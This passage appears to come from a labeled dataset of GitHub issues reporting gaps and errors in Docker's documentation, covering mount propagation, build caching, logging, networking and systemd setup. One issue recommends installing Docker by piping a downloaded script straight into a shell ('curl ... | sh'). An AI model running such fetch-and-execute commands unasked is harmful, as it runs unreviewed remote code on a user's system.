https://github.com/docker/docker/pull/17034#issuecomment-164824550, the documentation for this was supposed to be updated in a follow-up PR, but that doesn't seem to have happened.\n\nPlaces where it is missing or completely underwhelming:\n- https://docs.docker.com/engine/reference/run/\n- https://docs.docker.com/engine/reference/commandline/run/\n- https://docs.docker.com/engine/userguide/containers/dockervolumes/\n\nJust Ctrl+F for the word \"slave\" on those pages, and see that it is missing, or has no explanation.\n\nThis was originally brought up in #20555.\n\ncc @thaJeztah\n"},{"labels":["documentation",null],"text":"The documentation https://docs.docker.com/engine/reference/builder/#impact-on-build-caching explains that build-args only invalidate the cache for the first step in the Dockerfile that _uses_ the build-arg.\n\nGiven that build-args are prepended to each `RUN` instruction, the cache is actually invalidated for each `RUN` instruction (the build-cache does not evaluate `RUN` commands to check if a build-arg is actually _used_).\n\nThe documentation should explain this more clearly.\n\nI haven't checked yet if the build-cache actually evaluates `ENV` instructions to determine if the cache should be used or not, so this has to be checked before updating the documentation as well.\n\nFor more information/example/background, see https://github.com/docker/docker/issues/20136#issuecomment-187688636\n"},{"labels":["documentation",null],"text":"Description of problem:\nMy docker version is 1.9.1. I use the RemoteAPI(https://github.com/docker/docker/blob/master/docs/reference/api/docker_remote_api_v1.21.md) to have some tests. And I found that the docs is incomplete. For example, 'GET /containers/(id)/json' but 'GET /containers/(name)/json' is right too. Maybe we should complete this.\n@thaJeztah @moxiegirl \n"},{"labels":["documentation",null],"text":"Hi,\n\nI saw that docker 1.10 introduced new volumn mount options as \"[[r]shared|[r]slave|[r]private]\", what does   [r] means here?\n\nAlso does there are any detailed explain for the meaning of each type? share, slave and private? \n\nThanks!\n"},{"labels":["documentation",null],"text":"The documentation for docker volumes (found here: https://docs.docker.com/engine/userguide/containers/dockervolumes/) is woefully out of date.\n\nSince docker 1.9 includes top-level `volume` subcommands, and support for volume plugins, this documentation should be updated to reflect these new features.\nIt should also de-emphasize data-only containers as these are no longer considered a recommended pattern.\n"},{"labels":["documentation",null],"text":"As a follow up of #17513, we should complete the network options table:\n\nhttps://github.com/aidanhs/docker/blob/d736a9d2c3758fcc4eac0b62e9c7b128388021c1/docs/reference/commandline/network_create.md#bridge-driver-options\n\n/cc @aidanhs \n"},{"labels":["documentation",null,null],"text":"This official documentation on dockerizing a Node.js app is so misleading, and should highlight not for production.\n\n<blockquote class=\"twitter-tweet\" data-partner=\"tweetdeck\"><p lang=\"en\" dir=\"ltr\">This official documentation on dockerizing a Node.js app is so misleading, and should highlight not for production.<a href=\"https://t.co/ieb0qkIxLK\">https://t.co/ieb0qkIxLK</a></p>&mdash; Manoj Mahalingam (@manojlds) <a href=\"https://twitter.com/manojlds/status/699666115849400320\">February 16, 2016</a></blockquote>\n\n<script async src=\"//platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n"},{"labels":["documentation"],"text":"The current page for https://docs.docker.com/v1.10/engine/userguide/ is blank. It looks like the information that used to be there, such the information found in https://docs.docker.com/v1.8/userguide/ is now located at https://docs.docker.com/engine/userguide/intro/ but the only part of the docs that uses that link is the sidebar. The rest of the links still use either 'userguide/' or 'userguide/index'. I'm having difficulty finding the sidebar code but it seems like an easy fix to move the `userguide/intro.md` to `userguide/index.md` and then point the userguide introduction link found in the sidebar to that end point or change all the links from other documents to point to the intro. Not sure which way it should go but I can make PR if need be.\n"},{"labels":["documentation",null],"text":"Quoting the doc:\n\n> A plugin is a process running **on the same docker host** as the docker daemon, which registers itself by placing a file in one of the plugin directories described in Plugin discovery.\n\nThis is not entirely true because I can have a plugin listening on a domain/ip which can be located outside the daemon host (using the spec or json file).\n\nAlso, systemd socket activation isn't mentioned anywhere in the docs.\n"},{"labels":["documentation",null],"text":"I have an ELK cluster, configured to accept logs over a GELF socket, reachable on `$GELFADDR:$GELFPORT`.\n\nIf I send simple container logs to it, all is fine:\n\n```\ndocker run --log-driver gelf --log-opt gelf-address=udp://$GELFADDR:$GELFPORT \\\n  alpine echo hello world\n```\n\n→ The `hello world` log line shows up in Kibana. _Alles gut._\n\nIf I annotate the logs with a simple label, it still works:\n\n```\ndocker run --log-driver gelf --log-opt gelf-address=udp://$GELFADDR:$GELFPORT \\\n  --log-opt labels=mylabel -l mylabel=myvalue \\\n  alpine echo hello world\n```\n\n→ The log line (with the `mylabel=myvalue` custom field) shows up in Kibana.\n\nHowever, if I put a dot in the label name:\n\n```\ndocker run --log-driver gelf --log-opt gelf-address=udp://$GELFADDR:$GELFPORT \\\n  --log-opt labels=my.label -l my.label=myvalue \\\n  alpine echo hello world\n```\n\n→ The logstash logs show an error, because `.` is forbidden in field names.\n\nThis wouldn't be a big deal, if we weren't advocating the use of dotted labels (e.g. `com.docker.compose.project`).\n\nThere are multiple workarounds:\n- install the `de_dot` filter in logstash (but it doesn't ship by default; so it adds extra hoops compared to just using the stock logstash image from the registry)\n- add a custom Ruby filter to mangle the field names (super hackish, but works without authoring new images, just adding a few lines to the logstash config:\n\n```\nfilter {\n  ruby {\n    code => \"\n      event.to_hash.keys.each { |k| event[ k.gsub('.','_') ] = event.remove(k) if k.include?'.' }\n     \"\n  }\n}\n```\n\n(For the curious: see this [longer thread](https://discuss.elastic.co/t/field-name-cannot-contain/33251/12) about the issue with ElasticSearch))\n\nAt the very least, we should document that in the [logging section](https://docs.docker.com/engine/admin/logging/overview/).\n\nIf you want help to reproduce this behavior, I can provide Compose files to stage up an ELK cluster in a snap.\n\n/cc @moxiegirl \n"},{"labels":["documentation",null,null],"text":"I found some comments on an EMC blog that could point us to a doc error.\n\nhttp://blog.emccode.com/2016/02/04/what-you-need-to-know-about-storage-in-docker-1-10/#comments\n\n![image](https://cloud.githubusercontent.com/assets/1347209/12894929/b144dfc6-ce4e-11e5-8b70-ac9175a13380.png)\n\nhttps://docs.docker.com/engine/userguide/containers/dockervolumes/\n"},{"labels":["documentation",null],"text":"Hey,\n\nbecause I wasn’t very happy with the existing Docker API Client implementations in PHP, I’ve written a new one.\nYou can find the project here: https://github.com/jarkt/docker-php-client\n\nIt would be great, if you link the project here: https://docs.docker.com/engine/reference/api/remote_api_client_libraries/\n"},{"labels":["documentation"],"text":"I'm having issues getting the new `--volume /mnt/shared:/shared:shared` feature of 1.10 working (from #17034). \n\n``` bash\nroot@testhost:~# uname -a\nLinux testhost 3.18.5-031805-generic #201501292218 SMP Fri Jan 30 03:19:17 UTC 2015 x86_64 GNU/Linux\n\nroot@testhost:~# docker info\nContainers: 1\n Running: 0\n Paused: 0\n Stopped: 1\nImages: 9\nServer Version: 1.10.0-dev\nStorage Driver: overlay\n Backing Filesystem: extfs\nExecution Driver: native-0.2\nLogging Driver: json-file\nPlugins:\n Volume: local\n Network: host bridge null\nKernel Version: 3.18.5-031805-generic\nOperating System: Debian GNU/Linux 8 (jessie)\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 1.899 GiB\nName: loxflix\nID: RNAT:QYNF:66KE:DSN5:NRPC:ITAA:6G3M:WMR2:JABB:CPGO:ZN7O:FAVU\nDebug mode (server): true\n File Descriptors: 13\n Goroutines: 31\n System Time: 2016-01-24T08:45:00.139001319Z\n EventsListeners: 0\n Init SHA1: b84242d186971c8111d1f9de77b7c476bc049614\n Init Path: /usr/lib/docker/dockerinit\n Docker Root Dir: /var/lib/docker\nLabels:\n provider=generic\nExperimental: true\n\nroot@testhost:~# findmnt -o TARGET,PROPAGATION /mnt/testhost\nTARGET       PROPAGATION\n/mnt/shared shared\n\nroot@testhost:~# docker run --rm -it --volume /mnt/shared:/data:shared ubuntu:14.04\ndocker: Error response from daemon: Cannot start container 6859ea4fc2f23130da7e72f301c9a82528c6e78e406b6f68261d000410ad6960: Path /mnt/shared is mounted on /mnt/shared but it is not a shared mount..\n```\n\nI had this working under ubuntu. One of the key differences I noted was that `mount` indicated that the mount `/shared` had `-o bind` where as under debian, it doesn't seem to. \n"},{"labels":["documentation",null],"text":"I'm testing an overlay network in docker 1.10.0-rc1 that was not working in 1.9.1 (I'm running kernel 13.3)\n\nI run the following:\n\n```\ndocker network create --driver overlay es-bridge\n```\n\nI confirm the creation of the network:\n\n```\ndocker network ls\nNETWORK ID          NAME                DRIVER\ndf89455cbc24        bridge              bridge\n94df4ba9ba03        none                null\n1c4b0953f828        host                host\n4f0069ac54d2        es-bridge           overlay\n```\n\nThen add a busybox container to it:\n\n```\ndocker run -itd --net=es-bridge busybox\n3ab7ba1969c4084c9d0f0ed23525b05573405a21188fac67f890d6bdcc506807\ndocker: Error response from daemon: subnet sandbox join failed for \"10.0.0.0/24\": overlay subnet 10.0.0.0/24 has conflicts in the host while running in host mode.\n```\n\nThere are no other containers running on this node, and I've run the same container on several nodes and get the same result\n\n```\ndocker version\nClient:\n Version:      1.10.0-rc1\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   677c593\n Built:        Fri Jan 15 18:17:17 2016\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.10.0-rc1\n API version:  1.22\n Go version:   go1.5.3\n Git commit:   677c593\n Built:        Fri Jan 15 18:17:17 2016\n OS/Arch:      linux/amd64\n```\n\n```\ndocker info\nContainers: 3\n Running: 0\n Paused: 0\n Stopped: 3\nImages: 88\nServer Version: 1.10.0-rc1\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 104\n Dirperm1 Supported: false\nExecution Driver: native-0.2\nLogging Driver: json-file\nPlugins:\n Volume: local\n Network: overlay bridge null host\nKernel Version: 3.13.0-32-generic\nOperating System: Ubuntu 14.04.3 LTS\nOSType: linux\nArchitecture: x86_64\nCPUs: 8\nTotal Memory: 31.41 GiB\nName: c2b1s2.tera4.terascope.io\nID: EP32:TWMN:LIX6:5B2E:X3AR:FJAH:OVSG:PMVF:XQVQ:FUQ2:6NKF:HNH6\nWARNING: No swap limit support\nCluster store: zk://zk.host:2181\nCluster advertise: IP:2376\n```\n"},{"labels":["documentation"],"text":"I've wasted half a day because after I've created Vagrant-based Docker cluster + overlay networks, then a container could not ping another container even if /etc/hosts was updated properly when a container has joined or left a network. No Docker overlay networking doc or tutorial mentions the requirement that the Docker daemons that join the cluster are identified by the hostname they run on, and if a name clashes, then cross-host container communication is broken.\n"},{"labels":["documentation",null],"text":"Useful to read on a kindle or ipad on the daily commute.\n"},{"labels":["documentation",null],"text":"I used `apt-get install docker.io` and I ended up with version 1.6, though 1.9 is the latest.  So I had a look at https://docs.docker.com/engine/installation/ubuntulinux/ and my face melted, so I googled a bit harder and found that all I actually need run is this:\n\n```\ncurl -fsSL https://get.docker.com/ | sh\n```\n\n(edit: changed `wget` to `curl` because we use `curl` in all places now)\n"},{"labels":["documentation",null],"text":"Link at https://docs.docker.com/engine/extend/plugins/ to pachyderme volume plugin  link to 404 Not Found.\n"},{"labels":["documentation",null,null],"text":"Now that libnetwork uses DNS-based discovery, we should update the docs, and remove references to `/etc/hosts` being updated, see https://github.com/docker/docker/pull/19198#issuecomment-170384315\n\n/cc @sanimej \n"},{"labels":["documentation"],"text":"In the documentation we mention that AuthConfig objects are passed in the X-Registry-Auth header, but we never document the format of AuthConfig objects, or when/why they get passed.\n\nIf you've done a docker login, you'll get a base64 encoded json file which looks like:\n\n{\"username\":\"pdevine\",\"password\":\"mysecretpassword\",\"auth\":\"\",\"email\":\"pdevine@foo.com\",\"serveraddress\":\"192.168.1.101\"}\n\nIf you then do a docker logout, you'll get:\n\n{\"auth\":\"\",\"email\":\"\"}\n\nIf you're using passed tokens, you'll get something like:\n\n{\"registrytoken\": \"foo\"}\n\nWe should document:\n- each of the fields (I think the auth field is new and related to the recent authZ changes?)\n- when fields get omitted (not sure why we even pass anything back after a docker logout?)\n"},{"labels":["documentation",null],"text":"In this guide\nhttps://github.com/docker/docker/blob/master/docs/userguide/dockervolumes.md\n\nIt still refers \n\n```\nNote: Docker will not warn you when removing a container without providing the -v option to delete its volumes. If you remove containers without using the -v option, you may end up with \"dangling\" volumes; volumes that are no longer referenced by a container. Dangling volumes are difficult to get rid of and can take up a large amount of disk space. We're working on improving volume management and you can check progress on this in pull request #14214\n```\n\nBut the pull request was closed,  so either a new issue be linked with or remove that link\n"},{"labels":["documentation"],"text":"Hi,\n\nIn the apt installation instruction for Debian, seen here\nhttps://github.com/docker/docker/blob/master/docs/installation/debian.md#update-your-apt-repository\nyou should add a new point (e.g. after 3.) stating:\n\nInstall package `apt-transport-https` which is needed for https repository URIs.\n\n``` bash\napt-get install apt-transport-https\n```\n"},{"labels":["documentation",null],"text":"In many cases, the man pages are not \"self contained\" in that they don't contain the full documentation for a command.  All the information is only available on docs.docker.com. (Moved from #19034)\n\nFixing this problem should be part of a generation task.  \n"},{"labels":["documentation"],"text":"Markdown is OK: `Usage: docker import file|URL|- [REPOSITORY[:TAG]]`\n\nGenerated manpage is confusingly wrong:\n\n```\ndocker    import [-c|--change[=[]]] [-m|--message[=MESSAGE]] [--help]\nfile|URL|-[REPOSITORY[:TAG]]\n```\n\nbecause it misses the space between `file|URL|-` and `[REPOSITORY[:TAG]]`.\n\nOn a normal project I'd try to debug this, but the docker docs build is a bit mysterious to me, sorry.\n"},{"labels":["documentation",null],"text":"The current documentation and man pages are unclear about;\n- what a \"named\" volume is\n- differences between docker and docker-compose w.r.t. bind-mounted volumes (compose accepts paths relative to the docker-compose.yml, but docker only accepts absolute paths).\n- ~~man pages are not \"self contained\", I.e., in many cases, the full documentation is only available on docs.docker.com~~ (moving this to #19088 )\n\nAs reported on Twitter; https://twitter.com/mt_inside/status/683403251232944128\n"},{"labels":["documentation",null,null],"text":"Description of problem: adding a systemd config file to /etc/systemd/system/docker.service.d as documented in [Control and configure Docker with systemd](https://docs.docker.com/engine/articles/systemd) doesn't have the desired effect on storage driver used due to a missing =\n\n`docker version`: \n\n```\nClient:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.2\n Git commit:   a34a1d5\n Built:        Fri Nov 20 13:20:08 UTC 2015\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.2\n Git commit:   a34a1d5\n Built:        Fri Nov 20 13:20:08 UTC 2015\n OS/Arch:      linux/amd64\n```\n\n`docker info`:\n\n```\nContainers: 0\nImages: 0\nServer Version: 1.9.1\nStorage Driver: aufs\n Root Dir: /var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 0\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 4.2.0-16-generic\nOperating System: Ubuntu 15.10\nCPUs: 1\nTotal Memory: 3.843 GiB\nName: wily\nID: TMDH:I3EU:4QJW:QWOK:D6UV:MHTA:ZETE:THHF:5JAE:MVMW:LN7Q:X6DI\nWARNING: No swap limit support\n```\n\n`uname -a`:\n\n`Linux wily 4.2.0-16-generic #19-Ubuntu SMP Thu Oct 8 15:35:06 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux`\n\nEnvironment details (AWS, VirtualBox, physical, etc.):\n\nVMware Workstation 11 VM running Ubuntu 15.10 Server\n\nHow reproducible:\n\nConsistently reproducible\n\nSteps to Reproduce:\n\nTry to configure as documented:\n\n```\nsudo mkdir /etc/systemd/system/docker.service.d`\nsudo bash -c 'cat <<EOF > /etc/systemd/system/docker.service.d/overlay.conf\n[Service]\nExecStart=\nExecStart=/usr/bin/docker daemon -H fd:// --storage-driver overlay\nEOF'\nsudo systemctl daemon-reload\nsudo systemctl restart docker\nsudo docker info\n```\n\nAdd in the required = at the end of --storage-driver as documented in [daemon options](https://docs.docker.com/engine/reference/commandline/daemon/):\n\n```\nsudo mkdir /etc/systemd/system/docker.service.d`\nsudo bash -c 'cat <<EOF > /etc/systemd/system/docker.service.d/overlay.conf\n[Service]\nExecStart=\nExecStart=/usr/bin/docker daemon -H fd:// --storage-driver overlay\nEOF'\nsudo systemctl daemon-reload\nsudo systemctl restart docker\nsudo docker info\n```\n\nActual Results:\n\n`--storage-driver overlay` at the end of ExecStart means that aufs gets used\n\nExpected Results:\n\noverlay should be used\n\nAdditional info:\n\n`--storage-driver=overlay` at the end of ExecStart will correctly use overlay\n`--storage-driver btrfs` is perhaps a bad example anyway when the Docker team has been encouraging use of overlay since March.\n"},{"labels":["documentation",null,null],"text":"``` bash\n❯ docker pull gliderlabs/alpine\nUsing default tag: latest\nCannot connect to the Docker daemon. Is the docker daemon running on this host?\n```\n\nIt would be nice to \n- have the docker cli check for the existence of  `boot2docker`, \n  - **true**: attempt to run `boot2docker up` automatically \n  - **false**: a link to this error in a Docker FAQ (can't seem to find one [here](https://docs.docker.com/engine/misc/faq/), surprisingly)\n"},{"labels":["documentation",null],"text":"In https://docs.docker.com/v1.8/userguide/dockervolumes/\n\nit had\n\n docker run --volumes-from dbdata -v $(pwd):/backup ubuntu tar cvf /backup/backup.tar /dbdata\n\nThis tar would keep dbdata directory and its content.\n\nSo in following \n\ndocker run --volumes-from dbdata2 -v $(pwd):/backup ubuntu cd /dbdata && tar xvf /backup/backup.tar\n\nIt would wrong get /dbdata/dbdata/**\nos it is not restore and backup ways.\n\nIt should be changed as \n\ndocker run --volumes-from dbdata2 -v $(pwd):/backup ubuntu tar xvf /backup/backup.tar\n"},{"labels":["documentation",null,null],"text":"Currently `docker top CONTAINER [ps OPTIONS]` is a sort of proxy to the linux command `ps` but with the ability to lookup containers on remote daemons.\nIt has also _a lot_ of gotchas which are currently undocumented.\n\nFirstly, it's totally undocumented that the default `docker top` command w/o arguments will use the UNIX style ps arguments `-ef`.\nIssues come when people start to use the `[ps OPTIONS]` arguments. I understand you should know how ps arguments work before attempting to use them with Docker but it's undocumented that, for instance, as soon as you provide an option, the default `-ef` is _correctly_ dropped (cause ppl may want to use BSD style arguments).\n\nA clear example of people running into troubles is:\n\n``` sh\n$ docker run -d fedora /usr/bin/vi\n2f6f2c1d9a22e820c4b54e8e6baf7f1a40fc43c5e6efae5bdf45987e59d74f6f\n\n$ docker run -ti --rm fedora /bin/bash\n[root@be3f718de20d /]#\n\n$ docker ps\nCONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES\nbe3f718de20d        fedora              \"/bin/bash\"         15 seconds ago      Up 15 seconds                           elegant_jepsen\n2f6f2c1d9a22        fedora              \"/usr/bin/vi\"       40 seconds ago      Up 40 seconds                           insane_einstein\n```\n\nNow people will run `docker top` for the above 2 containers (which shells out to `ps -ef` and then filters out to the containers' pid):\n\n``` sh\n$ docker top be3f718de20d\nUID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD\nroot                21138               1400                0                   16:59               pts/2               00:00:00            /bin/bash\n\n$ docker top 2f6f2c1d9a22\nUID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD\nroot                21072               1400                0                   16:58               ?                   00:00:00            /usr/bin/vi\n```\n\nSo far so good. While sometihng like the following is pretty the same (given the daemon runs on the same machine as the client):\n\n``` sh\n$ ps -ef | grep $(docker inspect --format '{{ .State.Pid }}' be3f718de20d)\nroot     21138  1400  0 16:59 pts/2    00:00:00 /bin/bash\n```\n\nReal issues starts when those users start to play with `docker top` to select fields for instance. Let's say they're just interested in getting `pid,cmd` of the above two containers. Let's run `docker top` (as users might do w/o any documentation or deep knowledge of the difference between ps UNIX and BSD arguments):\n\n``` sh\n$ docker top be3f718de20d -o pid,cmd\nPID                 CMD\n\n$ docker top 2f6f2c1d9a22 -o pid,cmd\nPID                 CMD\n21072               /usr/bin/vi\n```\n\nTheir first WTF is why the first command doesn't show any output. So they play again, this time dropping the dash in `-o`:\n\n``` sh\n$ docker top be3f718de20d o pid,cmd \nPID                 CMD\n21138               /bin/bash\n\n$ docker top 2f6f2c1d9a22 o pid,cmd\nPID                 CMD\n```\n\nThis time they get the inverted output. Because running with BSD flags doesn't show processes w/o a TTY while the first one is inverted because the opposite, kind of, applies.\nWhat they really wanted to do to list both was:\n\n``` sh\n# BSD style\n$ docker top be3f718de20d axo pid,cmd\nPID                 CMD\n21138               /bin/bash\n$ docker top 2f6f2c1d9a22 axo pid,cmd\nPID                 CMD\n21072               /usr/bin/vi\n\n# UNIX style\n$ docker top be3f718de20d -eo pid,cmd\nPID                 CMD\n21138               /bin/bash\n$ docker top 2f6f2c1d9a22 -eo pid,cmd\nPID                 CMD\n21072               /usr/bin/vi\n```\n\nWhat I'm proposing is to better document all this gotchas and pitfalls (cause right now there's lack for this).\nI've already actually summarized an explanation of the above issue in this bugzilla also https://bugzilla.redhat.com/show_bug.cgi?id=1293063#c1 (I'm planning to sumbit a PR to resolve this but there would be need for other examples as well)\n"},{"labels":["documentation",null],"text":"prerequisites:\n\n```\n$ mkdir -p test/foo\n$ touch test/foo/{run,dev}\n$ cd test\n```\n\nhere I know `COPY` is documented to not be allowed in builds from `STDIN` (https://docs.docker.com/engine/reference/builder/#copy), yet I can build and get the error for `COPY` which requires two arguments not that `COPY` isn't allowed from `STDIN`\n\n```\n$ docker build -t test1 - <<EOF\nheredoc> FROM busybox\nheredoc> COPY ./foo/ $NO_SUCH\nheredoc> RUN /bin/true\nheredoc> EOF\nSending build context to Docker daemon 2.048 kB\nStep 1 : FROM busybox\n ---> d9551b4026f0\nStep 2 : COPY ./foo/\nCOPY requires at least two arguments\n```\n\nThe above should be because my shell expands `$NO_SUCH` and I get the error.\nif I double quote `EOF`:\n\n```\n$ docker build -t test2 - <<\"EOF\"\nFROM busybox\nCOPY ./foo/ $NO_SUCH\nRUN /bin/true\nEOF\nSending build context to Docker daemon 2.048 kB\nStep 1 : FROM busybox\n ---> d9551b4026f0\nStep 2 : COPY ./foo/ $NO_SUCH\nlstat foo/: no such file or directory\n```\n\nNow with Dockerfile(s):\n\n```\n$ cat > Dockerfile <<\"EOF\"\nFROM busybox\nCOPY ./foo/ $NO_SUCH_THING\nRUN /bin/true\nEOF\n\n# I'm using \"EOF\" to not escape the env\n\n$ docker build -t test3 .\nSending build context to Docker daemon 4.608 kB\nStep 1 : FROM busybox\n ---> d9551b4026f0\nStep 2 : COPY ./foo/ $NO_SUCH_THING\n ---> 72b33ade0818\nRemoving intermediate container 2844bb1cab7c\nStep 3 : RUN /bin/true\n ---> Running in 9907a0595847\n ---> 0f489092922f\nRemoving intermediate container 9907a0595847\nSuccessfully built 0f489092922f\n```\n\nEverything goes well and the resulting image has a `run` file in the `/`\n\nSo, it isn't documented anywhere that in `COPY <src> <dest>`, if `<dest>` is an empty string (`COPY ./foo/ \"\"` is legal) it will copy `<src>` to the root directory.\nThe build from a Dockerfile isn't failing with the error of at least two arguments because when evaluating an env, if no ENV are declared at all (either with `-e`) the `ProcessWord` return the empty https://github.com/docker/docker/blob/master/builder/dockerfile/shell_parser.go#L313 string and everything is now legal  because args is a slice with a string and an empty string. But it's undocumented.\n\nShould we document this behavior? Should we error out when `<dest>` is an empty string (I don't think so)? Didn't tested `ADD` like `COPY` but I think most of this applies as well.\n\n@duglin WDYT?\n"},{"labels":["documentation"],"text":"in the example: https://docs.docker.com/opensource/project/set-up-dev-env/\n\nwhenever follow this:\n\nThis host has no images. You may have one or more dangling images. A dangling image is not used by a running container and is not an ancestor of another image on your system. A fast way to remove dangling containers is the following:\n\n$ docker rmi -f $(docker images -q -a -f dangling=true)\n\nsometimes, the env not have dangling images, so it would complain like below:\n\n$ docker rmi -f $(docker images -q -a -f dangling=true)\ndocker: \"rmi\" requires a minimum of 1 argument.\nSee 'docker rmi --help'.\n\nUsage:  docker rmi [OPTIONS] IMAGE [IMAGE...]\n\nI propose we improve like this:\n\n$ dangling_images=`docker images -q -a -f dangling=true`; [ -n \"$dangling_images\" ] &&  docker rmi -f ${dangling_images}\n"},{"labels":["documentation",null,null],"text":"Description of problem:\n\nThe [Installation on on Mac OS X](https://docs.docker.com/engine/installation/mac/) tutorial instructs users to mount a local folder as a container volume for nginx to serve.\n\n```\n$ docker run -d -P -v $HOME/site:/usr/share/nginx/html --name mysite nginx\n$ echo \"my new site\" > index.html\n$ echo \"This is cool\" > cool.html\netc.\n```\n\nThis works, but if you're a little red riding hood such as myself, you may let the whale-wolf trick you into venturing into the forrest to pick some flowers for your grandmother, or in my case overwrite one of the files with new data. This will drive you into the arms of a [5 years old vboxfs sendfile bug](https://www.virtualbox.org/ticket/9069), causing updates to the file to show only partially, or not at all, when served via nginx. And we all know how that story ends :smile: .\n\n`docker version`:\nClient:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.3\n Git commit:   a34a1d5\n Built:        Fri Nov 20 17:56:04 UTC 2015\n OS/Arch:      darwin/amd64\n\nServer:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.3\n Git commit:   a34a1d5\n Built:        Fri Nov 20 17:56:04 UTC 2015\n OS/Arch:      linux/amd64\n`docker info`:\nContainers: 12\nImages: 65\nServer Version: 1.9.1\nStorage Driver: aufs\n Root Dir: /mnt/sda1/var/lib/docker/aufs\n Backing Filesystem: extfs\n Dirs: 89\n Dirperm1 Supported: true\nExecution Driver: native-0.2\nLogging Driver: json-file\nKernel Version: 4.1.13-boot2docker\nOperating System: Boot2Docker 1.9.1 (TCL 6.4.1); master : cef800b - Fri Nov 20 19:33:59 UTC 2015\nCPUs: 1\nTotal Memory: 1.956 GiB\nName: default\nID: P2Y6:MOYK:HJRI:XNP2:LAZ5:JB4C:CLHS:I56K:BEVH:WTTK:ZY3G:IGPY\nDebug mode (server): true\n File Descriptors: 20\n Goroutines: 35\n System Time: 2015-12-15T13:16:40.814333675Z\n EventsListeners: 0\n Init SHA1: \n Init Path: /usr/local/bin/docker\n Docker Root Dir: /mnt/sda1/var/lib/docker\nUsername: felixge\nRegistry: https://index.docker.io/v1/\nLabels:\n provider=virtualbox\n`uname -a`:\nDarwin Felix-MBP-2012.local 15.0.0 Darwin Kernel Version 15.0.0: Sat Sep 19 15:53:46 PDT 2015; root:xnu-3247.10.11~1/RELEASE_X86_64 x86_64\n\nVirtualBox:  5.0.10 r104061\n\nSteps to Reproduce:\n1. Follow the tutorial\n2. Overwrite one of the html files with e.g. \"echo 1235\" > index.html after initially creating it\n3. Reload the file in the browser\n\nYou may need to overwrite several times with different data to see the problem. I've also found that `echo <data> > <file>`  produces the problem more reliably than editing it with vim.\n\nIdeally this bug could be fixed in VirtualBox. But short of that, I think the best solution is to create a dedicated description of this as a \"known issue\" somewhere, and link to that article from the installation tutorial, as well as other tutorials that make use of nginx / containers that are using sendfile.\n"},{"labels":["documentation",null],"text":"MHN requires 3.16.  Our installation documentation should mention this and cover the  upgrade of the kernel. \n"},{"labels":["documentation"],"text":"in doc https://github.com/docker/docker/blob/master/experimental/userns.md it only said, for example:\n\nThe following standard Docker features are currently incompatible when running a Docker daemon with experimental user namespaces enabled:\n\n```\nsharing namespaces with the host (--pid=host, --net=host, etc.)\n```\n\nWhen I enabled user namespace  feature, and try this\n\n$ docker run -it --ipc=host  ubuntu /bin/sh\n# \n\n~$ docker run -it --uts=host  ubuntu bash\nroot@dockerexper:/# \n\nBoth can works, I did not know what \" etc\" . here means and  what's the issue with pid or net ? what's failure for that, without it, it can not verify if this feature is work as design or not.\n"},{"labels":["documentation"],"text":"I believe the pull command list in [this section](https://docs.docker.com/userguide/dockerimages/#image-digests) is incorrect.\n\nHas:\n\n```\n$ docker pull ouruser/sinatra@cbbf2f9a99b47fc460d422812b6a5adff7dfee951d8fa2e4a98caa0382cfbdbf\n```\n\nShould be:\n\n```\n$ docker pull ouruser/sinatra@sha256:cbbf2f9a99b47fc460d422812b6a5adff7dfee951d8fa2e4a98caa0382cfbdbf\n```\n"},{"labels":["documentation"],"text":"https://docs.docker.com/reference/api/docker_remote_api/\n\n![image](https://cloud.githubusercontent.com/assets/668860/10025840/2b075478-6113-11e5-8b6c-b07477b1e507.png)\n"},{"labels":["documentation"],"text":"$ docker version\nClient:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.2\n Git commit:   a34a1d5\n Built:        Fri Nov 20 13:12:04 UTC 2015\n OS/Arch:      linux/amd64\n\nServer:\n Version:      1.9.1\n API version:  1.21\n Go version:   go1.4.2\n Git commit:   a34a1d5\n Built:        Fri Nov 20 13:12:04 UTC 2015\n OS/Arch:      linux/amd64\n\nFollow this guide  https://docs.docker.com/engine/reference/run/\nPID setting part: it has reference run \"docker run --pid=host rhel7 strace -p 1234\"\n\n$ docker run --pid=host rhel7 strace -p 1234\nUnable to find image 'rhel7:latest' locally\nPulling repository docker.io/library/rhel7\n6883d5422f4e: Download complete \nStatus: Downloaded newer image for rhel7:latestr.io/library/rhel7 \ndocker.io/library/rhel7: this image was pulled from a legacy registry.  Important: This registry version will not be supported in future versions of docker.\nexec: \"strace\": executable file not found in $PATH\nError response from daemon: Cannot start container ed48301d82536e4ff30d83f4c15a146661252fe60ddac50943de21572e01881e: [8] System error: exec: \"strace\": executable file not found in $PATH\n"},{"labels":["documentation"],"text":"The default network driver (I.e. Bridge) has additional options that can be passed when creating a custom network, these options aren't documented (unless I overlooked). We should add the options to the documentation.\n\nFor reference, see https://github.com/docker/docker/issues/18237#issuecomment-161737492\n"},{"labels":["documentation",null,null,null],"text":"I was quite surprised and disappointed when the installer said that it requires x64.\n\nYou should specify this \"little\" detail somewhere on the Docker site: in filename and on a couple of pages, like [here](https://docs.docker.com/windows/step_one/) and [here](https://www.docker.com/docker-toolbox), I think, so people know that it won't work on their x86 Windows BEFORE they download and try to install Docker.\n"},{"labels":["documentation",null],"text":"Found this when reading docs.docker.com;\nhttps://docs.docker.com/engine/reference/\n\nThat page is published using 192.168.99.100 as domain name\n\n<img width=\"1738\" alt=\"screen shot 2015-12-01 at 13 00 13\" src=\"https://cloud.githubusercontent.com/assets/1804568/11500207/e6f469ba-982b-11e5-8941-0d11a86d876f.png\">\n"},{"labels":["documentation",null,null,null],"text":"I'm sorry if this is a tiresome topic, but I can't find a good answer.\n\nI have started to look for which storage driver to use for my Docker machines in production.\nOverlayfs looked like the one to use, 